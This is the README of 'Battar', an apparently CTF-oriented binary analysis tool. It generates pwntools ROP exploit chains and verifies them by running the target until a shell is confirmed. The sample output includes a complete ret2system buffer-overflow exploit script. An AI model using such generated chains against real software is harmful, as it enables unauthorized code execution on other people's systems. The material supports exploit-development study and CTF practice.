<div align="center">

```
                                                        ⚔
                                              ⚔        ╱
                                             ╱     ────╱
                                        ────╱
```

# ⚔️ BATTAR — بتّار

### Static & dynamic recon for ELF and PE binaries — built for exploit development.

![Python](https://img.shields.io/badge/python-3.8%2B-blood_red?style=for-the-badge&logo=python&logoColor=white&color=8B0000)
![Platform](https://img.shields.io/badge/platform-linux-black?style=for-the-badge&logo=linux&logoColor=white)
![Arch](https://img.shields.io/badge/arch-x86%20%7C%20x86--64-black?style=for-the-badge)
![Status](https://img.shields.io/badge/exploits-verified%20live-8B0000?style=for-the-badge)

*The blade that doesn't just point at the target — it cuts.*

</div>

---

```
██████╗  █████╗ ████████╗████████╗ █████╗ ██████╗
██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗
██████╔╝███████║   ██║      ██║   ███████║██████╔╝
██╔══██╗██╔══██║   ██║      ██║   ██╔══██║██╔══██╗
██████╔╝██║  ██║   ██║      ██║   ██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
        Battar — بتّار — red-core toolkit
```

`battar` is a single-file Python CLI that takes a binary and gives you everything you'd normally open five different tools for: protections, symbols, strings, danger signals, packer/entropy checks — and, uniquely, a **ret2libc/ret2system exploit generator that actually tests its own output** by running the target locally and confirming it pops a shell before showing it to you.

Every time you launch it, a short sword-slash animation plays in your terminal before the logo settles — because static analysis should feel as sharp as the name.

---

## ⚡ Why this exists

Most recon scripts stop at `checksec`. `battar` goes further:

- It doesn't just tell you a binary is missing a canary — it tells you *what that means for exploitation*.
- It doesn't just list `system()` and `/bin/sh` — it builds you a **working pwntools exploit script** around them, with real addresses already filled in.
- It doesn't just guess the buffer-overflow offset — it can **actually run the binary**, crash it with a cyclic pattern, and read the exact offset out of the corefile.
- It doesn't just print an exploit and hope — it **runs the generated exploit itself**, confirms a shell (or flag) actually comes back, and tells you plainly if it didn't.

Everything is designed around one idea: **static analysis tells you what *might* work; Battar tries to tell you what *does*.**

---

## 🩸 Features

### Core recon
| Section | What it shows |
|---|---|
| `build` | Compiler version (`.comment`), Build ID (ELF) / compile timestamp, linker version, PDB path (PE) |
| `packer` | Known packer section signatures (UPX, ASPack, Themida, VMProtect…), missing-section-header heuristic, high-entropy flag |
| `entropy` | Overall + per-section Shannon entropy with a visual bar — spot packed/encrypted sections at a glance |
| `functions` / `symbols` / `plt` / `got` | Standard ELF listings, address-resolved (`<func+offset>` style) |
| `sections` / `imports` / `exports` | PE equivalents |
| `strings` | Fast in-process string extraction (no shelling out to `strings`) |
| `interesting` | Auto-flags **19 categories** in extracted strings: private keys, AWS keys, JWTs, crypto wallet addresses, credentials, shell commands, SQL, format-string bugs, registry keys, GUIDs, user agents, URLs/emails/IPs, paths, and suspicious base64/hex blobs |
| `dangerous` | Flags 40+ risky functions (`gets`, `strcpy`, `system`, `CreateRemoteThread`, `LoadLibraryA`…) by severity, with a one-line reason for each |
| `gadgets` | Byte-level ROP gadget search across the binary *and* its resolved libc — `pop reg; ret` combos, stack pivots, `syscall; ret`, and more |

### ⚔️ The Exploit Helper (`--section exploit`)
Given a vulnerable ELF, Battar detects which of four strike patterns apply and forges a ready-to-run pwntools script for each:

| Strategy | When it applies | Needs a leak? |
|---|---|---|
| **A — Direct ret2system** | `system()` + `"/bin/sh"` both present in the binary | No |
| **B — Leak, then ret2system** | `puts`/`printf` available to leak libc | Yes |
| **C — Raw `execve()` syscall chain** | `"/bin/sh"` + syscall-arg gadgets in the binary itself | No — works even with no libc at all |
| **D — `open`+`read`+`write` flag chain** | A CTF-style flag filename string + syscall gadgets + a writable `.bss` | No |

Every strategy:
- Fills in real addresses (`system@plt`, gadget addresses, GOT entries) automatically.
- Auto-detects a `pop rdi; ret` gadget in the binary — and a *separate* one in the resolved libc for post-leak stages — instead of leaving it blank.
- Prefers a combined multi-register gadget (`pop rdi; pop rsi; pop rdx; ret`) over three separate ones when the binary has it, for a shorter chain.
- Warns you explicitly if PIE or a stack canary will break the naive version of the chain.

### 🎯 Dynamic verification (opt-in, `--auto-offset`)
This is the part that sets `battar` apart from a template generator:

1. **Auto-detects the overflow offset** — sends progressively longer [De Bruijn cyclic patterns](https://docs.pwntools.com/en/stable/util/cyclic.html), lets the target crash, reads the corefile, and extracts the exact offset from whichever register got clobbered (PC, saved RBP/EBP, or general-purpose registers as a fallback).
2. **Tells the difference between a real overflow and a canary catching it** — a `SIGABRT` is reported as "stack canary caught it," not a generic failure.
3. **Actually runs the generated exploit** and checks for a real shell (or real flag content, for Strategy D) before telling you it works.
4. **Automatically works around x86-64 stack-alignment crashes** — if `system()`'s internal `movaps` instructions need 16-byte alignment and the chain doesn't naturally line up, it retries with an inserted alignment gadget and keeps whichever variant actually works.

This is real code execution against the target binary — see [Safety](#-safety) below.

### 📊 Risk Summary
Every run ends with a scorecard: protections status, entropy, packer findings, dangerous-function count, interesting-string hits, and which exploit strategy (if any) applies — rolled into a single `LOW` / `MEDIUM` / `HIGH` verdict.

---

## 🛠️ Requirements

```bash
pip install pwntools pefile capstone --break-system-packages
```

- Python 3.8+
- `pwntools` — ELF/PE parsing, process control, corefile analysis
- `pefile` — PE-specific parsing
- Linux (dynamic testing features spawn and crash the target locally)
- `gdb` recommended for corefile support (`apt install gdb`)

---

## 🚀 Usage

```
battar <path_to_binary> [options]
```

| Flag | Description |
|---|---|
| `--section NAME [NAME ...]` | Only run these sections (space-separated). Omit to run everything. File info & protections always print. |
| `--all` | Show every entry in listing sections instead of truncating |
| `--limit N` | Rows to show per section before truncating (default: `40`) |
| `--min-len N` | Minimum string length for `--section strings` (default: `4`) |
| `--auto-offset` | **Executes the target locally** to auto-detect the overflow offset and verify the generated exploit. Off by default. |
| `--auto-offset-timeout SECONDS` | Crash-detection timeout per attempt (default: `5`) |

Valid section names: `build`, `packer`, `entropy`, `functions`, `symbols`, `plt`, `got`, `sections`, `imports`, `exports`, `strings`, `interesting`, `dangerous`, `exploit`, `gadgets`.

### Examples

```bash
# Full recon, everything, no truncation
battar ./chall --all

# Just the exploit-relevant sections
battar ./chall --section dangerous exploit gadgets

# Generate AND verify a working exploit locally
battar ./chall --section exploit --auto-offset

# Wider crash-detection window for a slow/heavy binary
battar ./chall --section exploit --auto-offset --auto-offset-timeout 15

# Dig through strings for secrets, no length filter noise
battar ./suspicious.exe --section interesting --min-len 6 --all

# See everything a stripped static binary still leaks
battar ./target_stripped --section build packer entropy dangerous gadgets --all
```

---

## 📺 Sample output

```
 PROTECTIONS (checksec)
══════════════════════════════════════════════════════════════════════
  NX                    Enabled
     └─ Stack is non-executable, need ROP/ret2libc instead of direct shellcode
  Canary                Disabled
     └─ No protection on the return address, a classic buffer overflow may work directly
  ...

 EXPLOIT HELPER (ret2libc / ret2system)
══════════════════════════════════════════════════════════════════════
  system() in PLT           Yes
  "/bin/sh" in binary       Yes
  pop rdi; ret (binary)     0x40115e

  [!] --auto-offset: running the target locally with a cyclic pattern (timeout 5s)...
  [+] Detected OFFSET = 72 (crash via rbp=0x6161617261616171, cyclic offset 64 (+8))

  Strategy A: Direct ret2system (no leak needed)

  from pwn import *

  elf = ELF('./chall')
  p = process(elf.path)

  OFFSET = 72              # auto-detected via --auto-offset
  POP_RDI = 0x40115e       # pop rdi; ret (found in the binary)

  payload  = b'A' * OFFSET
  payload += p64(POP_RDI)
  payload += p64(0x402004)   # "/bin/sh" found inside the binary
  payload += p64(0x401054)   # system@plt

  p.sendline(payload)
  p.interactive()

  [✓] VERIFIED WORKING locally — shell confirmed (echo marker received back)

 RISK SUMMARY
══════════════════════════════════════════════════════════════════════
  Format            ELF
  NX                ✓ Enabled
  Canary            ✗ Disabled
  Exploit path      ret2system (direct, no leak)

  Overall verdict   [ HIGH RISK ]
```

---

## 🩸 Safety

`--auto-offset` **executes the target binary** on your machine to fuzz it with a cyclic pattern and, if an exploit chain is found, to verify it. This is intentional and central to what makes Battar useful — but it means:

- Only use it on binaries you trust or intend to test (CTF challenges, your own code, authorized targets).
- It's off by default; plain recon (`battar ./binary`) never executes the target.
- Each run cleans up its own corefiles and validates that any corefile it reads actually belongs to the process it just spawned (protects against stale/reused-PID corefile confusion).

---

## 🗺️ Architecture support

| | ELF | PE |
|---|---|---|
| Recon (protections, symbols, strings, packer, entropy, build info) | ✅ | ✅ |
| Dangerous functions / interesting strings | ✅ | ✅ |
| ROP gadget search | ✅ x86 / x86-64 | — |
| Exploit Helper (Strategies A–D) | ✅ x86 / x86-64 | — |
| `--auto-offset` dynamic verification | ✅ x86-64 (full), x86 (offset detection only) | — |

PE binaries get full static recon; the exploit/gadget features are Linux ELF concepts and print a clear note explaining why they don't apply on Windows targets instead of silently doing nothing.

---

## 🧠 Design notes

- **Nothing is claimed without evidence.** If a gadget isn't found, the script says `<FILL IN>` and tells you how to find it (`ROPgadget --binary ... | grep rdi`) instead of guessing. If verification fails, you get the actual reason (missing gadget, canary, PIE needing a leak) — not a silent fallback.
- **Byte-pattern gadget search, not disassembly.** Any address where the right bytes occur is a valid ROP gadget when jumped to directly — that's the whole basis of ROP — so a plain byte scan across `.text` is correct and fast, with no disassembler dependency for gadget-finding.
- **Truncated by default, complete on request.** Every listing section defaults to 40 rows with a clear "N more not shown" note; `--all` removes the cap entirely.

---

<div align="center">

**⚔️ Part of the Battar red-core toolkit ⚔️**

</div>
